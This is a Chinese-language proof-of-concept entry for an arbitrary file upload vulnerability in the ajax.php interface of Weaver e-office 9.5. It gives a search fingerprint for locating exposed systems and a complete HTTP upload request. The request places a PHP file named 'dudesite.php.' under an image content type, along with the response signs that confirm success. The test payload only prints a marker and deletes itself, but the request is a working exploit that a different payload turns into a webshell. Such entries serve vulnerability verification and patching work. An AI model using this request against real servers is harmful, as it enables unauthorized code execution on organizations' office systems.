﻿# 泛微e-office系统ajax.php接口 任意文件上传漏洞

> 更新时间：2024-04-19

> 漏洞编号：

> 漏洞说明：泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件。泛微 E-Office 9.5版本存在代码问题漏洞，泛微e-office系统ajax.php接口存在任意文件上传漏洞

> 漏洞特征：app="泛微-EOffice"

> 验证脚本：HTTP

```
POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1
Content-Type: multipart/form-data; boundary=c2307d1cd1165cfacd8cd7c008f44d1e
Cookie: testBanCookie=test; ecology_JSessionId=abcLQ67J8J80DciAxUz5y; JSESSIONID=abcLQ67J8J80DciAxUz5y; ecology_JSessionid=abcLQ67J8J80DciAxUz5y
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Expect: 100-continue
Connection: close

--c2307d1cd1165cfacd8cd7c008f44d1e
Content-Disposition: form-data; name="upload_quwan"; filename="dudesite.php."
Content-Type: image/jpeg

<?php echo "12321";unlink(__FILE__); ?>
--c2307d1cd1165cfacd8cd7c008f44d1e
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream


--c2307d1cd1165cfacd8cd7c008f44d1e--
```

> 响应代码特征：200

> 响应内容特征：dudesite.php

> 上传文件定位：

> 验证文件来源：泛微e-office系统ajax.php接口 任意文件上传漏洞.poc

